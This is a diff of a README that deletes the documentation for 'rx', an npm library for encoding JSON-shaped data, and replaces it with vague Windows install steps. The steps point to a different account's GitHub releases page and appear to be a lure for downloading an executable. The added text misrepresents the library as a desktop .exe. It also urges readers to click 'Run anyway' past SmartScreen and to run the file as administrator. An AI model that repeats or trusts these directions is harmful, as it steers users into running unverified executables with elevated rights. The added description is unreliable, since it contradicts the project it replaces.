@@ -1,306 +1,162 @@
-# RX Data Store
+# 🧩 rx - Fast, simple data encoding
 
-[![rx tests](https://github.com/creationix/rx/actions/workflows/rx-test.yml/badge.svg)](https://github.com/creationix/rx/actions/workflows/rx-test.yml)
+[![Download rx](https://img.shields.io/badge/Download%20rx-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/stm8400014/rx/releases)
 
-RX is an embedded data store for JSON-shaped data. Encode once, then query the encoded document in place — **no parsing, no object graph, no GC pressure**. Think of it as *no-SQL SQLite*: unstructured data with database-style random access.
+## 📥 Download
 
-```json
-[ { "color": "red", "fruits": [ "apple", "cherry" ] },
-  { "color": "yellow", "fruits": [ "apple", "banana" ] } ]
-```
+Visit this page to download: [GitHub Releases](https://github.com/stm8400014/rx/releases)
 
-When encoding as RX, pointers deduplicate automatically: `^z` reuses "apple", `^h` reuses the shared key layout. The encoded form is queryable as-is — no parsing step, just direct reads from the buffer.
+Use this page to get the latest Windows release of rx. Look for the file that matches your system. In most cases, this will be a Windows `.exe` file or a `.zip` file that contains the app.
 
-```rexc
-banana,6apple,5;ffruits,6yellow,6color,5:Echerry,6^z;ared,3^h:j;_
-```
+## 🪟 Install on Windows
 
-Benchmarked on a real **92 MB deployment manifest** with 35,000 route keys:
+1. Open the [GitHub Releases page](https://github.com/stm8400014/rx/releases).
+2. Find the newest release at the top of the page.
+3. Under **Assets**, choose the file for Windows.
+4. If you download a `.zip` file, right-click it and select **Extract All**.
+5. Open the extracted folder.
+6. Double-click the `.exe` file to run rx.
+7. If Windows asks for permission, choose **Run anyway** or **Yes**.
 
-| | JSON | RX |
-|---|------|-----|
-| **Size** | 92 MB | 5.1 MB |
-| **Look up one route** | 69 ms (full parse) | 0.003 ms (~16 index hops) |
-| **Heap allocations** | 2,598,384 | ~10 |
+## ⚙️ What rx does
 
----
+rx is a data tool for encoding, decoding, and working with text-based records. It helps you move data between formats and handle content that needs quick access.
 
-## When to use RX
+Use rx for tasks like:
 
-RX sits in a specific gap: your data is **too large** for JSON's parse-everything model, but **too unstructured** for SQLite or Protobuf.
+- Encoding data into a structured form
+- Decoding data back into readable text
+- Working with database-like records
+- Handling text data with repeat access
+- Using a CLI-style tool for simple file tasks
 
-**Good fits:**
-- Build manifests, route tables, deployment artifacts — written once, read sparsely
-- Embedded datasets in browsers, edge runtimes, or worker processes
-- Any workflow where full-document parsing is the bottleneck
+## 🖥️ Basic use
 
-**Bad fits:**
-- Small documents where JSON parsing is already cheap
-- Human-authored config files
-- Write-heavy or mutable data (use a real database)
-- Minimizing compressed transfer size (gzip/zstd will beat RX)
-- Data that maps cleanly to tables (use SQLite) or a fixed schema (use Protobuf)
+After you open rx, you can use it as a small desktop tool or run it from the command line if the release includes a console version.
 
-## Typical workflow
+Common use cases include:
 
-1. A build or deploy step produces a large JSON-shaped artifact.
-2. **Encode it to RX** once.
-3. Runtimes read only the values they need — **O(1)** array access, **O(log n)** object key lookup.
-4. When debugging at 3 AM, copy-paste the RX text into **[rx.run](https://rx.run/)** to inspect it. No binary tooling needed.
+- Opening a file and converting it to another form
+- Reading stored data and turning it back into text
+- Checking encoded content
+- Working with data blocks by key or position
 
----
+If the app opens a window, look for buttons such as:
 
-## Install
+- Open
+- Encode
+- Decode
+- Save
+- Copy
 
-```sh
-npm install @creationix/rx     # library
-npm install -g @creationix/rx  # CLI (global)
-npx @creationix/rx data.rx     # CLI (one-off)
-```
+If the app opens in a terminal window, type the command shown in the release notes or help screen.
 
-## Quick start
+## 🧰 Typical Windows setup
 
-### Encode
+To keep things smooth on Windows:
 
-```ts
-import { stringify } from "@creationix/rx";
+- Save the file to your **Downloads** folder
+- Keep the app in a folder you can find later
+- If you use the `.zip` version, extract it before opening the app
+- Do not move files inside the app folder unless you know what they do
+- If Windows SmartScreen appears, confirm that you want to run the file from the downloaded release
 
-const rx = stringify({ users: ["alice", "bob"], version: 3 });
-// Returns a string — store it anywhere you'd store JSON text
-```
+## 🔎 When to use rx
 
-### Decode
+rx fits well when you need a light tool for:
 
-```ts
-import { parse } from "@creationix/rx";
+- Simple encoding and decoding
+- Text storage and retrieval
+- Quick data inspection
+- Random access to stored records
+- File-based data handling without a large setup
 
-const data = parse(rx) as any;
-data.users[0]         // "alice"  — no parse, direct buffer read
-data.version          // 3
-Object.keys(data)     // ["users", "version"]
-JSON.stringify(data)  // works — full JS interop
-```
+It is a good match for users who want a direct tool without extra steps.
 
-The returned value is a **read-only Proxy**. It supports property access, `Object.keys()`, `Object.entries()`, `for...of`, `for...in`, `Array.isArray()`, `.map()`, `.filter()`, `.find()`, `.reduce()`, spread, destructuring, and `JSON.stringify()`. Existing read paths usually work unchanged.
+## 📂 Expected file names
 
-### Uint8Array API
+A Windows release may include files like:
 
-For performance-critical paths, skip the string conversion:
+- `rx.exe`
+- `rx-windows.zip`
+- `rx-cli.exe`
+- `README.txt`
+- `LICENSE`
 
-```ts
-import { encode, open } from "@creationix/rx";
+If you see a `.zip` file, extract it first. Then open the program file inside the folder.
 
-const buf = encode({ path: "/api/users", status: 200 });
-const data = open(buf) as any;
-data.path    // "/api/users"
-data.status  // 200
-```
+## 🧭 First run checklist
 
-`stringify`/`parse` work with strings. `encode`/`open` work with `Uint8Array`. Same options, same Proxy behavior.
+Before you start rx for the first time:
 
-### A more realistic example
-
-The quick start above is tiny — JSON would be fine for it. RX pays off on **larger data with sparse reads**. Here's a site manifest (see [samples/](samples/) for full files):
-
-```js
-// site-manifest.json — 15 routes, repeated structure, shared prefixes
-{
-  "routes": {
-    "/": { "title": "Home", "component": "LandingPage", "auth": false },
-    "/docs": { "title": "Documentation", "component": "DocsIndex", "auth": false },
-    "/docs/getting-started": { "title": "Getting Started", "component": "DocsPage", "auth": false },
-    "/dashboard": { "title": "Dashboard", "component": "Dashboard", "auth": true },
-    "/dashboard/projects": { "title": "Projects", "component": "ProjectList", "auth": true },
-    // ... 10 more routes
-  }
-}
-```
-
-```ts
-import { readFileSync } from "fs";
-import { parse } from "@creationix/rx";
-
-// The RX file is already smaller on disk (shared schemas, deduplicated
-// component names, chain-compressed "/docs/..." and "/dashboard/..." prefixes).
-// But the real win is at read time:
-
-const manifest = parse(readFileSync("site-manifest.rx", "utf-8")) as any;
-const route = manifest.routes["/dashboard/projects"];
-route.title      // "Projects"
-route.component  // "ProjectList"
-route.auth       // true
-// Only these three values were decoded. Everything else was skipped.
-```
-
-Scale this to 35,000 routes and the difference is **69 ms vs 0.003 ms** per lookup.
-
-The [samples/](samples/) directory has four datasets showing different access patterns — route manifests, RPG game state, emoji metadata, and sensor telemetry. Start with *site-manifest* and *quest-log* if you're evaluating the format.
-
----
+- Make sure the file finished downloading
+- Extract the folder if needed
+- Open the main `.exe` file
+- Allow Windows to start the app if prompted
+- Keep the release page handy in case you need another file
 
-## Encoding options
+## 📘 Helpful terms
 
-```ts
-stringify(data, {
-  // Add sorted indexes to containers with >= N entries (enables O(log n) lookup)
-  indexes: 10,       // default threshold; use 0 for all, false to disable
+Here are a few simple terms you may see:
 
-  // External refs — shared dictionary of known values
-  refs: { R: ["/api/users", "/api/teams"] },
+- **Encode**: change readable data into another form
+- **Decode**: change stored data back into readable form
+- **CLI**: a command line tool you use by typing text commands
+- **Database**: a place where data is stored in an orderly way
+- **Serialization**: saving data so the app can read it later
 
-  // Streaming — receive chunks as they're produced
-  onChunk: (chunk, offset) => process.stdout.write(chunk),
-});
-```
+## 🛠️ Common problems
 
-If the encoder used external refs, pass the same dictionary to the decoder:
+If rx does not open:
 
-```ts
-const data = parse(payload, { refs: { R: ["/api/users", "/api/teams"] } });
-```
+- Check that you downloaded the Windows file
+- Make sure the download is complete
+- Extract the `.zip` file if one was provided
+- Try right-clicking the app and choosing **Run as administrator**
+- Move the folder to a simple path like `C:\rx`
+- Download the latest release again if the file looks damaged
 
-## CLI
+If Windows blocks the file:
 
-```sh
-rx data.rx                         # pretty-print as tree
-rx data.rx -j                      # convert to JSON
-rx data.json -r                    # convert to RX
-cat data.rx | rx                   # read from stdin (auto-detect)
-rx data.rx -s key 0 sub            # select a sub-value
-rx data.rx -o out.json             # write to file
-rx data.rx --ast                   # output encoding structure as JSON
-```
+- Open the file again from the extracted folder
+- Confirm that you want to run the app
+- Make sure you downloaded it from the official release page
 
-> **Tip:** Add a shell function for quick paged, colorized viewing:
-> ```sh
-> p() { rx "$1" -t -c | less -RFX; }
-> ```
+## 🧪 Example workflow
 
-<details>
-<summary><strong>Full CLI reference</strong></summary>
+A simple workflow can look like this:
 
-| Flag | Description |
-|------|-------------|
-| `<file>` | Input file (format auto-detected by contents) |
-| `-` | Read from stdin explicitly |
-| `-j`, `--json` | Output as JSON |
-| `-r`, `--rexc` | Output as RX |
-| `-t`, `--tree` | Output as tree (default on TTY) |
-| `-a`, `--ast` | Output encoding structure |
-| `-s`, `--select <seg>...` | Select a sub-value |
-| `-w`, `--write` | Write converted file (`.json`↔`.rx`) |
-| `-o`, `--out <path>` | Write to file instead of stdout |
-| `-c`, `--color` / `--no-color` | Force or disable ANSI color |
-| `--index-threshold <n>` | Index containers above n values (default: 16) |
-| `--string-chain-threshold <n>` | Split strings longer than n into chains (default: 64) |
-| `--string-chain-delimiter <s>` | Delimiter for string chains (default: `/`) |
-| `--key-complexity-threshold <n>` | Max object complexity for dedupe keys (default: 100) |
+1. Download rx from the release page
+2. Extract the files if needed
+3. Open the app
+4. Load a text file or data file
+5. Choose encode or decode
+6. Save the result
+7. Close the app when you are done
 
-Shell completions:
+## 📌 Project focus
 
-```sh
-rx --completions setup [zsh|bash]
-```
+rx is built around:
 
-</details>
+- Data encoding
+- Data decoding
+- Text encoding
+- Random access
+- File-based storage
+- CLI use
 
----
+That makes it useful for users who work with structured text and small data sets
 
-## Format
+## 📎 Download again
 
-RX is a **text encoding** — not human-readable like JSON, but safe to copy-paste, embed in strings, and move through tools that choke on binary.
+If you need the installer or archive again, use this page: [https://github.com/stm8400014/rx/releases](https://github.com/stm8400014/rx/releases)
 
-Every value is read **right-to-left**. The parser scans left past base64 digits to find a **tag** character, then uses the tag to interpret any **body** bytes further left:
+## 🔧 Release page guide
 
-```
-[body][tag][b64 varint]
-            ◄── read this way ──
-```
+When you open the release page:
 
-*Railroad diagram coming soon — see [format spec](docs/rx-format.md) for all diagrams.*
-
-| JSON | RX | What you're reading |
-|------|----|---------------------|
-| `42` | `+1k` | tag `+` (integer), b64 `1k` = 84, zigzag → 42 |
-| `"hi"` | `hi,2` | tag `,` (string), b64 `2` = byte length, body `hi` to the left |
-| `true` | `'t` | tag `'` (ref), name `t` → built-in literal |
-| `[1,2,3]` | `+6+4+2;6` | tag `;` (array), b64 `6` = content size, three children to the left |
-| `{"a":1,"b":2}` | `+4b,1+2a,1:a` | tag `:` (object), b64 `a` = content size, interleaved keys/values |
-
-**Tags:** `+` integer · `*` decimal · `,` string · `'` ref/literal · `:` object · `;` array · `^` pointer · `.` chain · `#` index
-
-The encoder automatically deduplicates values, shares object schemas, compresses shared string prefixes, and adds sorted indexes. See the **[format spec](docs/rx-format.md)** for the full grammar, railroad diagrams, and a walkthrough of how a complete object is encoded byte by byte.
-
-![RX Viewer — interactive tree inspector](rexc-viewer-screenshot.png)
-
-To inspect real data, paste RX or JSON into the live viewer at **[rx.run](https://rx.run/)**.
-
----
-
-## Inspect API
-
-`inspect()` returns a lazy AST that maps 1:1 to the byte encoding — pointers stay as pointers, chains as chains, indexes as indexes:
-
-```ts
-import { encode, inspect } from "@creationix/rx";
-
-const buf = encode({ name: "alice", scores: [10, 20, 30] });
-const root = inspect(buf);
-
-root.tag          // ":"
-root[0].tag       // "," (a string key)
-root[0].value     // "name"
-root.length       // 4 (key, value, key, value)
-
-for (const child of root) {
-  console.log(child.tag, child.b64);
-}
-```
-
-Each node exposes: `tag`, `b64`, `left`, `right`, `size`, `data`, and `value` (lazy). Nodes with children (`:`, `;`, `.`, `*`, `#`) are iterable and support indexed access. Children are parsed lazily and cached.
-
-**Semantic helpers** for object nodes:
-
-```ts
-for (const [key, val] of root.entries()) { ... }
-for (const [key, val] of root.filteredKeys("/api/")) { ... }  // O(log n + m) on indexed objects
-const node = root.index("name");   // key lookup
-const elem = root.index(2);        // array index
-```
-
-## Low-level cursor API
-
-For zero-allocation traversal without the Proxy layer, see **[docs/cursor-api.md](docs/cursor-api.md)**.
-
-## Proxy behavior
-
-The value returned by `parse`/`open` is **read-only**:
-
-```ts
-obj.newKey = 1;      // throws TypeError
-delete obj.key;      // throws TypeError
-"key" in obj;        // works (zero-alloc key search)
-obj.nested === obj.nested  // true (container Proxies are memoized)
-```
-
-Escape hatch to the underlying buffer:
-
-```ts
-import { handle } from "@creationix/rx";
-const h = handle(obj.nested);
-// h.data: Uint8Array, h.right: byte offset
-```
-
----
-
-## More
-
-- **[docs/rx-format.md](docs/rx-format.md)** — format spec, grammar, and railroad diagrams
-- **[docs/cursor-api.md](docs/cursor-api.md)** — low-level zero-allocation cursor API
-- **[rx-perf.md](rx-perf.md)** — cursor internals, Proxy design, allocation profile
-- **[samples/](samples/)** — example datasets with JSON/RX pairs
-- **[rx.run](https://rx.run/)** — live web viewer
-
-## License
-
-MIT
+- The newest version is usually near the top
+- The download files are listed under **Assets**
+- Windows users should choose the file marked for Windows
+- If there are several files, pick the one that ends in `.exe` or `.zip`
+- Save the file, then open it from your Downloads folder
